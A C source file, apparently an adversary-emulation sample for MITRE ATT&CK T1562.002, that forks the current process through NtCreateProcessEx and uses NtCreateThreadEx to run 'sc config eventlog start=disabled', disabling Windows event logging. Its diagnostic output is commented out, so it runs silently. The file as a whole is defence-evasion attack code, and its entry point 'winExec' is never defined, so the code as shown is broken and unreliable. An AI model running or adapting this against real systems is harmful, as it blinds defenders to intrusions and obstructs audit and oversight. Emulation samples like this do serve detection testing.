// Link      = https://attack.mitre.org/techniques/T1562/002/
// Technique = Impair Defenses: Disable Windows Event Logging
// ID        = T1562.002
// Tactics   = Defense Evasion

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#define RUN(to_run) const char* cmdArgs = to_run;

// NtCreateProcessEx function prototype
typedef NTSTATUS(WINAPI* NtCreateProcessExType)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    BOOLEAN InJob
    );

typedef NTSTATUS(WINAPI* NtCreateThreadExType)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG ZeroBits,
    ULONG StackSize,
    ULONG MaximumStackSize,
    PVOID AttributeList);

int main() {
    // Load ntdll.dll to retrieve NtCreateProcessEx
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        //printf("Failed to load ntdll.dll\n");
        return -1;
    }

    NtCreateThreadExType NtCreateThreadEx = (NtCreateThreadExType)GetProcAddress(ntdll, "NtCreateThreadEx");
    if (!NtCreateThreadEx) {
        //printf("Failed to load NtCreateThreadEx\n");
        return -1;
    }

    NtCreateProcessExType NtCreateProcessEx = (NtCreateProcessExType)GetProcAddress(ntdll, "NtCreateProcessEx");
    if (!NtCreateProcessEx) {
        //printf("Failed to locate NtCreateProcessEx in ntdll.dll\n");
        return -1;
    }

    // Step 1: Open the current process as the parent process
    HANDLE parentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
    if (!parentProcess) {
        //printf("Failed to open parent process (error %d)\n", GetLastError());
        return -1;
    }

    // Step 2: Create a new process using NtCreateProcessEx
    HANDLE newProcessHandle;
    NTSTATUS status = NtCreateProcessEx(
        &newProcessHandle,             // Process handle to be returned
        PROCESS_ALL_ACCESS,            // Desired access
        NULL,                          // Object attributes (NULL for default)
        parentProcess,                 // Parent process handle
        0,                             // Flags (e.g., 0 for default behavior)
        NULL,                          // Section handle (e.g., NULL for new section)
        NULL,                          // Debug port
        NULL,                          // Exception port
        FALSE                          // InJob (FALSE for not part of a job object)
    );

    if (status != 0) {
        //printf("Failed to create process (status 0x%%x)\n", status);
        CloseHandle(parentProcess);
        return -1;
    }

    //printf("Process created successfully. Process handle: %%p\n", newProcessHandle);

    // Step 3: Write the command line into the new process memory
    RUN("sc config eventlog start=disabled");
    //const char* cmdArgs = "calc.exe 0 1 0";
    SIZE_T cmdArgsSize = lstrlenA(cmdArgs) + 1;

    LPVOID remoteMemory = VirtualAllocEx(newProcessHandle, NULL, cmdArgsSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMemory) {
        //printf("Failed to allocate memory in the new process (error %%d)\n", GetLastError());
        CloseHandle(newProcessHandle);
        CloseHandle(parentProcess);
        return -1;
    }

    if (!WriteProcessMemory(newProcessHandle, remoteMemory, cmdArgs, cmdArgsSize, NULL)) {
        //printf("Failed to write memory in the new process (error %%d)\n", GetLastError());
        VirtualFreeEx(newProcessHandle, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(newProcessHandle);
        CloseHandle(parentProcess);
        return -1;
    }

    //printf("Command line written to the new process memory.\n");

    // Step 4: Start the process using a remote thread
    HANDLE threadHandle;
    status = NtCreateThreadEx(
        &threadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        newProcessHandle,
        winExec, // Entry point (WinExec)
        remoteMemory, // Arguments (command line string)
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status < 0) {
        //printf("Failed to create thread in the new process (status 0x%%x)\n", status);
        VirtualFreeEx(newProcessHandle, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(newProcessHandle);
        CloseHandle(parentProcess);
        return -1;
    }

    //printf("Thread created successfully. New process started.\n");

    // Wait for the thread to complete
    WaitForSingleObject(threadHandle, INFINITE);

    // Clean up
    CloseHandle(threadHandle);
    CloseHandle(newProcessHandle);
    CloseHandle(parentProcess);

    return 0;
}